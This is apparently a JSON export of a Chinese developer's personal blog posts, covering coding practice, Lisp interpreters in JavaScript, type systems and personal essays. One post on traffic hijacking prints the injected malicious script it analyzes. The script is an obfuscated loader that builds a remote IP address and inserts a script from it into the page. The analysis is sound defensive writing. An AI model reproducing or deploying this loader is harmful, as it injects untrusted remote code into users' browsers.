[
  {
    "fileName": "项目规范化开发.md",
    "ID": 0,
    "Title": "项目规范化开发",
    "Tags": "随想",
    "PublishDate": "2019/7/13 22:29:28",
    "Content": "## why\r\n\r\n大部分项目缺少文档、注释、测试、编码不规范、changelog，又加上 IT 行业流动性较大，导致后来的人接手困难，哪怕并没有人员变动，项目也会随着时间的推移与代码量的膨胀逐步导致协作的困难，技术债越积越多，从而导致项目进展推动困难甚至项目失败。\r\n\r\n## how\r\n\r\n常见的解决方案是在项目流程上对交付件做出硬性规定，甚至对交付件的都有相应的规范与模板，但大多数最终都会流于形式变成应付，交付件质量奇差，敷衍了事。\r\n\r\n因此在流程上进行约束是不能完全有效的，流程的产生通常来自于这样的过程，最佳实践 -> 规范标准化 -> 流程化，到了流程这一步其实已经可以考虑将其自动化用 IT 工具来承载了，只有自动化才能让开发人员爽，爽了才愿意做乐意做并做好。\r\n\r\n**文档、changelog** 这两个其实都可以通过工具来自动生成，常见如 JSDOC 能从代码中抽取规范化的注释生成文档，changelog 也可以通过规范的 Git commit message 来生成。\r\n\r\n开发人员的大部分工作成果都是通过 Git 来交付的，在这一过程中我们可以使用一些工具来拦截到 Git 的 commit、push 等操作来执行一些预处理脚本，如进行代码风格检查、格式化、文档生成等工作，可以使用 **Husky** 来做，配合其他的工具，我们就可以使项目规范化开发更轻松无痛的落地。<strong>……</strong>"
  },
  {
    "fileName": "雨.md",
    "ID": 1,
    "Title": "雨",
    "Tags": "碎念",
    "PublishDate": "2017/7/17 14:43:00",
    "Content": "![](http://imglf2.nosdn.127.net/img/UUcvQWZBZk9URHhUNmthQzQxSXpDWExXNkhtMXNxK0VTemVWL3FMZTcwZ0hJckcyTDVRQTF3PT0.jpg?imageView&thumbnail=1680x0&quality=96&stripmeta=0&type=jpg)\r\n狂风暴雨下撑伞并没什么用，还不如一件雨衣来得实在。\r\n    <strong>……</strong>"
  },
  {
    "fileName": "闲扯带团队与代码质量管理.md",
    "ID": 2,
    "Title": "闲扯带团队与代码质量管理",
    "Tags": "编码 | 随想",
    "PublishDate": "2018/9/12 22:45",
    "Content": "## 团队\r\n\r\n这是我第一次正儿八经担任技术 Leader 角色，“我们需要一个能力强一点的，能带团队的人”，一开始我本以为自己只要干好自己的事情，然后顺带帮忙解决下队友遇到的技术问题就好。显然，我有些天真了，当我看到我的KPI 里包含团队产出的指标时，我就开始认真严肃思考带团队这一回事了，从干好自己的活，到带领团队干好活，这并不容易，关于如何带团队，我有阅读过一些书籍，有的讲管理方法和流程，有的讲什么领导力，但是这都不能解决我所面临的现状，或者说很难落地。\r\n\r\n仔细思考一下，带团队这件事情并不仅仅意味着管理，那些所谓的管理多数是面向 Boss 来说的，作为一个技术 Leader 而非 Boss，我要做的很简单，那就是带领团队完成任务，并将其尽可做得更好，单纯通过管理手段并不能完成任务，所以**考虑怎么管好不如考虑怎么做好**，带团队就得深入项目里干活，作为榜样，作为火车头拉动整列车，而不是坐在头等舱里等着项目收获。\r\n\r\n怎么把事情做好？我当然相信自己能做好，这是出于对自身技术能力的自信，那么问题来了，怎么让整个团队都把事情做好？我想有几点是尤为重要的：\r\n\r\n1. **清晰、明确、合理**的任务分配与目标\r\n2. **赋能！赋能！赋能！**\r\n3. 规范与流程\r\n\r\n关于任务分配与管理，这不用多讲，有诸多方法论和工具来做，但是光是分配任务而不能驱动成员完成也是扯淡的。再一个就是规范和流程的重要性，我曾以为规范与流程阻碍效率，但是没有规范和流程，效率会更加惨淡，规范和流程怎么来？从优秀实践来，我们做事总会积累些好的经验和实践，这些都可以文档化变成 CheckList 或是规范或是流程，然后用 IT 工具来承载运作。<strong>……</strong>"
  },
  {
    "fileName": "通过gitHub与Issues构建博客.md",
    "ID": 3,
    "Title": "通过gitHub与Issues构建博客",
    "Tags": "碎念",
    "PublishDate": "2017/7/16 19:20:56",
    "Content": "![](http://imglf0.nosdn.127.net/img/UUcvQWZBZk9URHhUNmthQzQxSXpDWlhMeitBckdwOVhzNEZtb05xSndtaXowOHpKNEJyREd3PT0.jpg?imageView&thumbnail=1680x0&quality=96&stripmeta=0&type=jpg)  \r\n简单来说就是在Issues里写博文，通过官方提供的API来获取数据，然后再由前端的MD解析器动态渲染到页面上。  \r\n\r\nAPI:https://developer.github.com/v3/issues/\r\n    <strong>……</strong>"
  },
  {
    "fileName": "通过acme.sh申请Let's Encrypt证书.md",
    "ID": 4,
    "Title": "通过acme.sh申请Let's Encrypt证书",
    "Tags": "编码",
    "PublishDate": "2017/8/27 17:43:02",
    "Content": "已经可以看到很多网站都启用了https，这年头丢个http的链接出去都有点不好意思了，当然，HTTPS的好处也不仅是好看这么简单，相较于HTTP，它带来的最直接好处就是你再也不用担心恶心的运营商劫持并植入广告了，还有被GFW墙掉的风险，你担心网页打开速度？SPDY 和 HTTP2 目前的实现默认使用 HTTPS 协议。  \r\n\r\n现在各大浏览器厂商也开始对非HTTPS站点标记不安全标识，同时搜索引擎也开始降低非https网站的权重，国内各大网站已经全面上HTTPS了。我这种小博客也寻思着如何追赶潮流，但是证书是要钱滴，而且级别越高价格越贵，好在有Let's Encrypt这个免费颁发DV证书的CA，看到SPONSORS里一堆大佬，所以应该是挺可靠的。虽然提供的证书有效期短，但是借住acme.sh这个国人开发的工具，可以很方便的自动申请并更新证书，因此尽管放心使用好了。\r\n\r\n[acme.sh](https://github.com/Neilpang/acme.sh)是一个实现了ACME协议的linux命令行工具，那在windows上咋用？如果你是win10，那么安装Ubuntu子系统即可，具体使用看官方文档。<strong>……</strong>"
  },
  {
    "fileName": "选择.md",
    "ID": 5,
    "Title": "选择",
    "Tags": "碎念",
    "PublishDate": "2018/9/10 0:32",
    "Content": "人生中那些命运的转折点发生时，你或许会以为那一天和所有那些度过的平常日子一样，或许并没有什么特殊，或许天气还略显糟糕，但是当你回过头来你才会发现，那一天所做的决定才造就了现在的你。\r\n\r\n选择是如此重要，但是选择时往往会低估其后果，有时候我以为的那些重要选择，在整个人生来看反而显得无足轻重了。有时候也会迷茫，有时候根本不知道自己面临命运的转折，命运这个东西就是这么难以琢磨，如果相信冥冥中有某种命运安排的话，它就像给了你一道选择题，但是没告诉你的分值，然后这些选择就和其它一样，淹没在琐碎的日常中，也许一不小心就做了道送命题。\r\n\r\n如果不知道接下来该做什么的话，那就去做不会后悔的事情吧，问问自己有哪些事情是现在做了不后悔的，以后也不会后悔的，无论失败还是成功，不要用贪心策略去过人生，你也许能拿到局部最优解，但却会错过全局最优，尝试跳出舒适圈去做决定。无论怎样，所有人都会过完这一生，如果用某种社会公认的价值去衡量这一生是否值得，那就太显得无趣了，社会公认的价值是什么呢？高收入、社会地位、房、车，所有这些归根结底就是一个钱字，如果用它来给人生打分那就太令人失望了，但是很显然，我所做的选择里，大部分情况下，价值评估函数都是用钱来打分的，这真是无奈啊。<strong>……</strong>"
  },
  {
    "fileName": "过去的 2018.md",
    "ID": 6,
    "Title": "过去的 2018",
    "Tags": "随想",
    "PublishDate": "2019/1/27 21:44:00",
    "Content": "![西藏](http://wx4.sinaimg.cn/large/c3007076ly1fzll6syk32j218w0u0dku.jpg)\r\n\r\n似乎永远也无法预料到人生的旅途会走到哪里，正如去年我曾以为自己将在长沙度过今后的时光，工作、安家然后娶妻生子。我本以为会是如此，也这样做着，在长沙找了份收入相对较高的工作，尽管做到后面对公司的状态有诸多不满，但是看在钱的份上，不要试图用大厂的标准来要求了。\r\n\r\n然后接到了阿里的面试电话，然后 N 多次面试后，我收到了 Offer，这是我经历过的最长的面试，到后面我纯粹是抱着学习的态度在接受面试，以至于是否能够拿到 Offer 我都已经不在乎了，只要能从提问中知道更多自己知识的盲区就是有价值的。这个 Offer 确实在我意料之外，因为我清楚的知道自己的优势和劣势，但是无论如何，对于心中尚存的一丝不甘的我而言，这个 Offer是我无法拒绝的。在这之前我几乎都要接受自己的命运了，那个我一眼就能看透今后十年的命运，尽管我有买考研的教材尝试挣扎一番，但也没抱太大期望，想着最好的结果就是离父母近些，方便今后照顾，事业或者说继续折腾，就这么算了吧，我本以为就这样了。<strong>……</strong>"
  },
  {
    "fileName": "超酷炫的字体.md",
    "ID": 7,
    "Title": "超酷炫的字体",
    "Tags": "碎念",
    "PublishDate": "2017/8/8 20:53:41",
    "Content": "![](http://imglf.nosdn.127.net/img/UUcvQWZBZk9URHhpYitWU1daWjRPVitUdXJSWFZHZ3h2S2ZOd1NoZGZ4SjhUSEx2ZUdNaDJRPT0.png?imageView&thumbnail=500x0&quality=96&stripmeta=0&type=jpg)  \r\n\r\n如图，**Iosevka**是一个非常酷炫与性感的开源的字体。  \r\n没错！它是用代码生成的, 非常适合Coding，  \r\n使用之后，感觉Coding有神奇的Buff加成！  \r\n截图可能不够清晰，但实际效果是非常棒的！  \r\n[View Specimen](https://be5invis.github.io/Iosevka/specimen.html)  \r\n[Iosevka GitHub](https://github.com/be5invis/Iosevka)\r\n    <strong>……</strong>"
  },
  {
    "fileName": "读《原则》.md",
    "ID": 8,
    "Title": "读《原则》",
    "Tags": "读书",
    "PublishDate": "2018/5/29 00:31",
    "Content": "又不知道从哪篇博文里看到了《原则》这本书的推荐，习惯使然上豆瓣看了下评论，分数达 8.5 分让人意外，老实说，对于这种书名和介绍我会想当然将其归类为成功学、鸡汤便不再理会，不过作者确实是成功人士，或许某些观点也值得学习下。花了两晚上时间囫囵吞枣似的看完，做了写摘录，书中许多观点是很有价值的。\r\n\r\n## 原则\r\n\r\n> 思考，总结提炼原则，并且知行合一的实践原则，同时保持谦逊使得大脑更加开放和包容。\r\n>\r\n> 1. 独立思考并决定 \r\n> 2. 以可信度加权的方式做决定\r\n> 3. 遵照原则做事\r\n\r\n不仅要独立思考，同时要要保持谦逊和心胸开阔，才能动用自己的最佳思维，在肯定自己是对的之前，还要知道自己为什么是对的，对自己想法的肯定应该来自于事实，而非自以为是。\r\n\r\n## 投资\r\n\r\n> 股价反映的是人们的预期，当实际结果比预期好时，股价会上涨，反之则跌。<strong>……</strong>"
  },
  {
    "fileName": "记一次流量劫持.md",
    "ID": 9,
    "Title": "记一次流量劫持",
    "Tags": "编码",
    "PublishDate": "2018/9/17 15:15",
    "Content": "又是填队友坑，拿到代码本地启动后发现神奇的一幕，页面被劫持插入了广告，弹出几秒钟后消失。\r\n\r\n![jc0](http://wx3.sinaimg.cn/large/007113CZgy1fvcl8cuxcsj30bf037dgb.jpg)\r\n\r\n让我来看看这是咋回事，因为某个微信 sdk 使用了 http，该 JS 脚本的响应结果被篡改替换了。\r\n\r\n![jc2](http://wx3.sinaimg.cn/large/007113CZgy1fvcl8i86ugj30kq01dwei.jpg)\r\n\r\n![jc3](http://wx4.sinaimg.cn/large/007113CZgy1fvcl8ncohpj31370ia0va.jpg)\r\n\r\n**http://res.wx.qq.com/open/js/jweixin-1.2.0.js** 该请求因为使用了 http 给了流量劫持可乘之机，未能返回正确的脚本内容，而是返回了一个被精心构造的恶意脚本。\r\n\r\n简单分析下这个恶意脚本做了啥，我们 http 请求 **http://res.wx.qq.com/open/js/jweixin-1.2.0.js** 的响应结果被劫持替换成了下面的脚本，这个脚本又再次构造请求带上标识符去拿到真实的内容，同时将自己的恶意脚本注入到页面上。\r\n\r\n\r\n```javascript\r\n!function(e, t, n, o, r, i, a, c) {\r\n    // 这里有意思了，之后后会发现变量 c 的结果是一个 IP 地址\r\n    // \"124.232.160.178\"\r\n    // 这个 IP 地址加上拼凑的字符串变成了 http://124.232.160.178/v1/a/?u=0 \r\n    // 通过 insertBefore 注入了恶意脚本\r\n    c = function(e, t, n) {\r\n        for (t = e % 256,\r\n        n = 3; 0 < n; n--)\r\n            t = (e = Math.floor(e / 256)) % 256 + \".\" + t;\r\n        return t\r\n    }(2095620274),\r\n    (a = function(e) {\r\n        r = t.createElement(n),\r\n        i = t.getElementsByTagName(n)[0],\r\n        r.src = \"//\" + e,\r\n        i.parentNode.insertBefore(r, i)\r\n    }\r\n    // 这儿有点意思，似乎是为了避免重复劫持，\r\n    // 通过时间戳和标识符再次请求我们需要的脚本，\r\n    // 这次返回的是真实未被篡改的脚本内容\r\n    )(o + (0 < o.indexOf(\"?\") ? \"&\" : \"?\") + \"_t\" + (new Date).getTime() + \"=0i\"),\r\n    // 注入恶意脚本 http://124.232.160.178/v1/a/?u=0 \r\n    a(c + \"/v1/a/?u=0\")\r\n}(window, document, \"script\", \"res.wx.qq.com/open/js/jweixin-1.2.0.js\");\r\n```\r\n\r\n所以解决问题的办法就是把页面上的 http 替换成 https 或是把资源放到本地存储。<strong>……</strong>"
  },
  {
    "fileName": "裸辞.md",
    "ID": 10,
    "Title": "裸辞",
    "Tags": "碎念",
    "PublishDate": "2017/12/6 20:28:16",
    "Content": "当初我一个人来，现在要走了，却是除了回忆什么也带不走，很多的人和事也早已只能从回忆里寻找了，最后，我也把自己也活进了回忆里。\r\n\r\n这是计划中的离职，从入职的时候就考虑过的离开，只是离职的理由并非我最初所想的那样，一直身体硬朗的父亲年中突发脑溢血，尽管愈后精神不错，却丧失了大部分语言能力，行动也不便，如此结果也依旧要感谢上天保佑了，但愿父亲能够恢复的更好。\r\n\r\n父母在不远游，游必有方，本以为能在深圳多呆几年，但现在不光是离职的日程提前了，今后几年在哪工作也需要有所调整，作为家中独子，我必须在家人和事业二者间找到一个平衡点，以便于最大程度上兼顾。父母健康的时候我可以为自己找各种理由不回去，回顾在深圳的三年仅回去了三次，内心不免有些愧疚，离家远吗？ 仅 4 小时的高铁车程，说远也不见得，离职在计划之中，而原因却是意料之外，无论之后作何打算，先回家陪陪父母，这是最重要的。<strong>……</strong>"
  },
  {
    "fileName": "葬礼.md",
    "ID": 11,
    "Title": "葬礼",
    "Tags": "碎念",
    "PublishDate": "2019/7/10 00:16:00",
    "Content": "![葬礼](https://ksana.oss-cn-shenzhen.aliyuncs.com/articles/imgs/zangli.png)\r\n\r\n> 我的脑海中，进行着一场葬礼，悼念者络绎不绝\r\n>\r\n> 不停的走着，踩踏着直到仪式的氛围渐浓，当所有人入座\r\n>\r\n> 仪式开始，敲鼓的声音沉重有力，敲打着，敲打着\r\n>\r\n> 直到我的意识变得麻木，我听见他们抬起棺材\r\n>\r\n> 沉重的脚步，摇摇晃晃，我的灵魂，吱呀作响\r\n>\r\n> 四周，丧钟响起，天堂，就像一个铃铛\r\n>\r\n> 安静的我，如同异类，在此孤独，在此腐朽\r\n>\r\n> 失去依靠，理性开始崩塌\r\n>\r\n> 我从高处坠落，跌入一个又一个世界，最后终于看清\r\n>                                                                                                                                                                             — 艾米莉·迪金森\r\n\r\n抑郁不仅仅是意味着你你失去了快乐，还有最重要的活力，你失去了对一切事情提起兴致的能力，那些你曾经非常热爱的事物此时都不能唤起你对生活的一丝渴望。\r\n\r\n最近一段心情特别的压抑沉重，周末都宅在家中，下午犯困了便躺在沙发上睡了过去，醒来见到的是黑夜，感受着令人绝望的孤独，伴随着沉重的头痛，你没有任何期待，不知道接下来要做什么，只是勉强的望向窗外昏暗的天空，思绪陷入一片死寂。<strong>……</strong>"
  },
  {
    "fileName": "自由.md",
    "ID": 12,
    "Title": "自由",
    "Tags": "随想",
    "PublishDate": "2017/7/30 22:43:40",
    "Content": "![](http://imglf.nosdn.127.net/img/UUcvQWZBZk9URHhUNmthQzQxSXpDYktvemtFZ1RPNHVlWHNjZFZSVWRZWjhEejc1L2RWRk5RPT0.jpg?imageView&thumbnail=1680x0&quality=96&stripmeta=0&type=jpg)  \r\n人生的目的或许是为了追求自由吧，各种意义上的自由，你的工作为你带来了一定程度的消费自由，但你期望更多财务自由，为此而更加努力的工作着。  \r\n你喜欢看书，你获取知识，摄取理性，这使得你的精神和思想得以解放，这是对精神自由的追求。  \r\n所有的勤勉与努力，或多或少就是内心对自由的向往吧，这种对自由的渴望，仿佛是没有止境一般，因为存在，就是最大的约束。\r\n\r\n    <strong>……</strong>"
  },
  {
    "fileName": "编译原理学习.md",
    "ID": 13,
    "Title": "编译原理学习",
    "Tags": "编程",
    "PublishDate": "2018/5/27 23:26",
    "Content": "关于语言，首先要正确区分语法和语义\r\n\r\n# 语法的形式\r\n\r\n语法的形式一般用一集规则描述，而这个语言的表达能力也跟选取的规则不同。\r\n\r\n通常，基于最简单的三个规则，*拼接*、*选择*，*任意次数重复*即可构成一种一种**正则语言**，为了使表达能力更为强大，我们可以加入递归，从定义一种**上下文无关语言**。\r\n\r\n仅使用*拼接*、*选择*、*重复*三个规则我们就能定义所有的单词。\r\n```\r\ndigit -> 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9\r\nunsigned_integer -> digit digit*\r\n```\r\n上面是一个关于数字的定义，其中 | 意思是选择，* 代表任意次重复，这样一条规则称之为一个产生式，箭头左边的字符串称之为非终结符，由这样一个产生式导出来的字符串称之为终结符。\r\n\r\n对于描述一个程序设计语言而言，仅仅是这三条规则是远远不够的，我们还要加入**递归**。<strong>……</strong>"
  },
  {
    "fileName": "类型笔记.md",
    "ID": 14,
    "Title": "类型笔记",
    "Tags": "编程",
    "PublishDate": "2019/7/13 22:21:53",
    "Content": "## 类型系统\r\n\r\n#### 标明类型系统（Nominal Type System）\r\n\r\n```c#\r\npublic class Foo  \r\n{\r\n    public string Name { get; set; }\r\n    public int Id { get; set;}\r\n}\r\n\r\npublic class Bar  \r\n{\r\n    public string Name { get; set; }\r\n    public int Id { get; set; }\r\n}\r\n\r\nFoo foo = new Foo(); // Okay.\r\nBar bar = new Foo(); // Error!!!\r\n```\r\n\r\n#### 结构类型系统（Structural Type System）\r\n\r\n```typescript\r\nclass Foo {\r\n  method(input: string): number { ... }\r\n}\r\n\r\nclass Bar {\r\n  method(input: string): number { ... }\r\n}\r\n\r\nconst foo: Foo = new Foo(); // Okay.\r\nconst bar: Bar = new Foo(); // Okay.\r\n```\r\n\r\n**区别：** 标明类型系统比较的是类型本身，一致性要求高，结构类型系统比较的是类型的形状，即类型要满足的约束，若果两个类型满足相同的约束，那他们就是相同的类型，俗称鸭子类型，一个东西看上去和鸭子一样，行为和鸭子一样那它就是鸭子。\r\n\r\n**优缺点：**前者更严格，后者更灵活，适用于各种偏函数式的语言比如 JS 。\r\n\r\n\r\n#### 泛型（Generics）\r\n\r\n泛型可以类比为类型层面的函数声明，接受一个类型参数 -> 返回一个类型，足够强的类型系统是图灵完备的，可以进行编程，比如 TypeScript 中就有人用类型系统写素数判断的程序。\r\n\r\n#### 协变与逆变\r\n\r\n- **子类型**（subtype）子类型可以隐性的转换为父类型，比如 int 就是 flot 的子类型，即 int ≦ float。\r\n- **协变**（covariant）如果它保持了子类型序关系≦，该序关系是：子类型≦基类型。<strong>……</strong>"
  },
  {
    "fileName": "程序员技能思考.md",
    "ID": 15,
    "Title": "程序员技能思考",
    "Tags": "编程 | 随想",
    "PublishDate": "2018/7/9 16:06:33",
    "Content": "能力以外，最最重要的是，**保护好自己的好奇心与求知欲**，失去了这两点就失去了全部。\r\n\r\n我看到了前端技术圈的焦虑，“学不动了”、“求别更”、“35岁被离职”，这种焦虑似乎不仅局限于前端，而是整个 IT 技术圈都是如此，或许可以说任何变化快速的领域里都存在这样的情况。这种焦虑一方面来自变化本身，另一方面也来自于程序员对自身核心竞争力的错误认识。\r\n\r\n我也是焦虑的，尽管在年轻这一保护伞下似乎还不用过度担心被干掉，但是面对时不时推出的新技术还是不免也有些犹豫，我要不要去学习呢？万一这可能正是未来几年最火的技术怎么办？抓住机会或许就能走上人生巅峰了？\r\n\r\n我要学什么？什么值得学这是一个问题，我每天早上都有花半小时简单浏览下最新技术资讯的习惯，知乎专栏、掘金、开发者头条、各大厂技术公众号、V2EX等，然后把一些有价值的文章整理成列表放到待办里，然后抽时间阅读并总结，但是最近某些网站的投稿质量越来越低了，令人失望。这样下去并不是办法呀，太多了，知识真是太多了，这种学习或许称得上主动，但缺乏目的，我也嫌累了，却不敢放松，生怕落后跟不上潮流。<strong>……</strong>"
  },
  {
    "fileName": "用JS 实现 Lisp 里的流.md",
    "ID": 16,
    "Title": "用JS 实现 Lisp 里的流",
    "Tags": "编程",
    "PublishDate": "2018/3/10 21:24:59",
    "Content": "在 Lisp 我们这样实现\r\n``` lisp\r\n(define-syntax-rule (delay exp) \r\n    (memo-proc (lambda () exp)))\r\n(define-syntax-rule (cons-stream a b) \r\n  (cons a (delay b)))\r\n(define (stream-car stream) (car stream))\r\n(define (stream-cdr stream) (force (cdr stream)))\r\n(define the-empty-stream '())\r\n(define-syntax-rule (force delayed-object)\r\n  (delayed-object))\r\n(define (stream-null? stream)\r\n  (if (equal? stream the-empty-stream)\r\n      #t\r\n      #f))\r\n(define (stream-ref s n)\r\n  (if (= n 0)\r\n      (stream-car s)\r\n      (stream-ref (stream-cdr s) (- n 1))))\r\n```\r\n\r\n在 JavaScript  这样子\r\n``` javascript\r\nconst cons = (x, y) => [x, y]\r\nconst car = p => p[0]\r\nconst cdr = p => p[1]\r\nconst delay = (f, args) => _ => f.apply(this, args)\r\nconst force = f => f()\r\nconst consStream = (x, y, args) => cons(x, delay(y, args))\r\nconst streamCar = s => car(s)\r\nconst streamCdr = s => (force((cdr(s))))\r\nconst streamRef = (s, n) => n == 0 ? streamCar(s) : streamRef(streamCdr(s), --n)\r\n// 定义自然数组成的流\r\nconst interStaringFrom = n => consStream(n, interStaringFrom, [++n])\r\nconst intNumber = interStaringFrom(1)\r\n// 定义斐波拉契数列流\r\nconst fibgn = (a, b) => consStream(a, fibgn, [b, a + b])\r\nconst fibs = fibgn(0, 1)\r\n// 取费波拉契数列 100项\r\nstreamRef(fibs, 100)\r\n```\r\n\r\nScheme 使用的求值顺序是应用序，意味着函数的参数在调用时就会求值，所以 delay 是一个特殊形式，需要用宏来实现，否则就会陷入死循环。其中大部分代码都可以简单转写成 JS 的代码。但是在 JS 中没有宏这样的玩意咋办？ 简单点，我们可以曲线救国，对 consStream 的构造方法做一些修改，利用 `f.apply(this, args)` 来实现 delay，JavaScript中的迭代器和生成器也是一种类似思维的实现。\r\n\r\n流能做啥？如果我们需要对真实世界的各种对象进行模拟该如何办，从计算机的角度考虑，理所当然就是考虑引入赋值，通过变量的修改来模拟对象状态随时间变化，引进赋值可以增强系统的模块化，把一个系统的某些状态封装到不同的对象中去，那是否有不采用赋值的方式，从而模拟对象状态变化的方法呢？流就是这样一种方法，它能提供相同的模块化能力，而且不必引入赋值，从函数的思路来看，我们可以将状态看作是时间的函数，s(t)，如果将注意力集中在状态身上，那么它就一个不断变化的值，但是从状态的变化的整个历史上来看，可将其视为一个整体，所以从整体上来看是不变的。\r\n\r\n现在前端流行的 React 框架采用了函数式的思路，即 Render(State) => View，将视图看作是状态的计算结果，既然采用函数式范式，那么就要尽可能的使用不可变量，于是理所当然的使用了单向数据流的模式。<strong>……</strong>"
  },
  {
    "fileName": "用 JS 撸个 LISP 解释器（3）之作用域与闭包.md",
    "ID": 17,
    "Title": "用 JS 撸个 LISP 解释器（3）之作用域与闭包",
    "Tags": "编程 | JS | 坑",
    "PublishDate": "2018/6/10 23:58",
    "Content": "接上回，我们已经实现了一个基于 S 表达式的计算器，但还留下了这些坑\r\n\r\n* 变量绑定\r\n* 函数声明与调用\r\n* 闭包\r\n\r\n这几个特性对于一个编程语言而言是非常重要的，so...开始填坑吧\r\n\r\n## 变量绑定\r\n\r\n```\r\n<BODY> -> <DEFINE>* EXP <EXP>* \r\n<BINDSPEC> -> (<VAR> <EXP>)\r\n<LET> -> (let (<BINDSPEC>) <BODY>) | (let <VAR> (<BINDSPEC>) <BODY>)  \r\n```\r\n\r\n语法形式就从 Scheme R5RS 上抄好了，解析过程就不再另外写，基于 Parser Combinator ，在之前的例子上扩展就行，但是环境的定义有些改变，因为我们要实现词法作用域，现在我们的环境是由对象组成的数组。从下标 0 开始对应当前环境，1 对应外层环境，依次嵌套下去，就像 Express / KOA 的洋葱模型一样，从里到外。并实现了一个 lookup 方法用于在环境中寻找给定符号的值，这个查找过程可以类比于 javaScript 的作用域链查找。\r\n\r\n```javascript\r\n// 定义环境\r\nconst baseProcedure = {\r\n  '+': args => args.reduce((pre, cur) => cur + pre),\r\n  '-': args => args.reduce((pre, cur) => cur - pre),\r\n  '*': args => args.reduce((pre, cur) => cur * pre),\r\n  '/': args => args.reduce((pre, cur) => pre / cur),\r\n}\r\nconst env = [\r\n  baseProcedure\r\n]\r\n```\r\n\r\n**那么 let 绑定变量值意味着什么呢？**\r\n\r\n实际上 let 创造了一个新的环境，并将在该环境下对 body 部分进行求值。\r\n\r\n```javascript\r\nfunction letEval(exp, env) {\r\n  const value = exp.value\r\n  const frame = value.bindspecs.reduce((pre, cur) => {\r\n    pre[cur.value[0].value] = eval(cur.value[1], env)\r\n    return pre\r\n  },{})\r\n  // 处理另一种形式的 <LET> -> (let <VAR> <BINDSPEC> <BODY>) \r\n  // if (value.var) frame[value] = value.body\r\n  // 返回最后一个表达式的值\r\n  return value.body.value.map(e => eval(e, extEnv(frame, env))).pop()\r\n}\r\n```\r\n\r\n这就是我们对 let 表达式的解释，将 let 的 bind 取出来创建一个 frame 作为最内层环境插入 env，然后求值即可。<strong>……</strong>"
  },
  {
    "fileName": "用 JS 撸个 LISP 解释器（2）之 evalapply 循环.md",
    "ID": 18,
    "Title": "用 JS 撸个 LISP 解释器（2）之 eval/apply 循环",
    "Tags": "编程 | JS | 坑",
    "PublishDate": "2018/6/8 19:53",
    "Content": "接之前的坑，也许在真正开始写一个解释器之前，需要对解释器是什么做出解释才能继续。\r\n\r\n**解释器是什么？**\r\n\r\n解释器是一个在**特定上下文环境**中**求解表达式值**的过程。\r\n\r\n这个上下文环境包含原子符号和复杂符号，对表达式的求解过程就是将其逐步分解为原子符号的递归过程，这个过程就是 eval 函数，某种意义上 CPU 就是一个指令集的解释器。\r\n\r\n上篇中实现一个一个 tokenizer，并简单介绍了 Parser Combinator 的概念，接下来我将在此之上进一步用 Parser Combinator 实现 AST（抽象语法树） 的生成。\r\n\r\n```javascript\r\n// 一个高阶函数，用于创建标识符解析器， 比如说 Ｇ　-> s 解析 s 终结符\r\nconst ID = id => tokens => tokens[0] === id ? [{type: 'identifier', value: tokens[0]}, tokens.slice(1)] : null\r\n\r\n// 只要有一个解析器解析成功就是解析成功, 相当文法中的 | 符号，比如 G -> A | B | C\r\nconst OR = (...parsers) => tokens => {\r\n  for (const p of parsers) {\r\n    const result = p(tokens)\r\n    if (result) return result\r\n  }\r\n  return null\r\n}\r\n\r\n// 只有全部解析器都解析成功才成功， 相当于文法的连接\r\n// 比如对于文法 G -> A B C \r\n// 只有 A B C 都解析成功, G 才解析成功\r\nconst SEQ = (...parsers) => tokens => {\r\n  let result = []\r\n  let rest = tokens\r\n  for (const p of parsers) {\r\n    const r = p(rest)\r\n    if (r) {\r\n      result = result.concat(r[0])\r\n      rest = r[1]\r\n    } else return null\r\n  }\r\n  return [result, rest]\r\n}\r\n// 对 tokens 使用一个 parser 解析任意次，直到解析失败，将结果返回，max 设置为 -1 相当于正则里的 *\r\nconst REP = (parser, max = -1) => tokens => {\r\n  let count = 0;\r\n  let result = []\r\n  let rest = tokens\r\n  while(count >= max) {\r\n    const r = parser(rest)\r\n    if (r) { \r\n      result = result.concat(r[0])\r\n      rest = r[1]\r\n      count++\r\n    } else break\r\n  }\r\n  return [result, rest]\r\n}\r\n```\r\n\r\n和之前相比，我们的 parser 返回的不在是一个字符串，而是一个 AST 中的节点对象了，这里对象仅具备类型和值两个属性，如果有必要的话也可以机上行列号等内容为接下来语义分析过程提供更好的信息和报错提示。<strong>……</strong>"
  },
  {
    "fileName": "用 JS 撸个 LISP 解释器（1）之 ParserCombinator.md",
    "ID": 19,
    "Title": "用 JS 撸个 LISP 解释器（1）之 ParserCombinator",
    "PublishDate": "2018/6/3 21:45",
    "Tags": "编程 | JS | 坑",
    "Content": "一直想写个 LISP 解释器，为此啃 SICP、龙书、打印了 R5RS的规范文档，但是啃完这两本书实在太难了，咬牙坚持到了 SICP 四章，终于看到封面上那个 eval/ apply 循环的实现，这就是我入坑的动力啊，真要等到把书读完再去做，那估计这个愿望（坑）永远实现不了了，那就直接路撸起袖子上吧，哪怕做个玩具级别的。\r\n\r\n为什么这么执着 LISP 解释器呢？因为程序员三大浪漫啊！抛开浪漫不谈，看 eval / apply 循环这个图难道不觉得很 Cool 吗？ 有没有一种阴阳太极图的感觉，学起来真有一种学魔法的感觉。Cool~\r\n\r\n ![](https://camo.githubusercontent.com/0328cc5987e0ade0ba05d452171c90cbe4f61c43/687474703a2f2f67726f7570732e637361696c2e6d69742e6564752f6d61632f636c61737365732f362e3030312f6162656c736f6e2d737573736d616e2d6c656374757265732f77697a6172642e6a7067)\r\n\r\n\r\n\r\n事实上上实现一个 LISP 解释器并不难，为啥，因为这东西真的烂大街了，网上案例遍地都是，而且其语法足够简单，parser 起来不要太容易，并不需要你学会 DFA、NFA、LL，LR 这些分析算法才能做，直接强撸就是了，当然，会就更好了。\r\n\r\n不知道怎么动手？网上找不到好的案例？\r\n\r\n看这个Github 项目 [mal - Make a Lisp ](https://github.com/kanaka/mal)\r\n\r\n56 种语言 56 种 lisp 实现，还附赠编写指南 [The Make-A-Lisp Process](https://github.com/kanaka/mal/blob/master/process/guide.md)\r\n\r\n看不懂英文？这还有个翻译版的 [ The Make-A-Lisp Process 中文翻译 ](https://github.com/Windfarer/mal-zh#general-hints)\r\n\r\n当然，还有某个在扯淡的大佬文章 [怎么写一个解释器](http://www.yinwang.org/blog-cn/2012/08/01/interpreter)\r\n\r\n还有什么理由去拒绝尝试写一个 LISP 呢？\r\n\r\n那就开坑吧，在这之前知道一个编译器编译过程种的各个步骤就最好了，简单来说就是\r\n\r\n字符流 -> 词法分析 -> 符号流 ->语法分析 -> 抽象语法树(AST) -> 语义分析 -> 中间代码生成 -> 代码生成优化\r\n\r\n大概就这样，对于 LISP 解释器来说，知道怎么搞到 AST 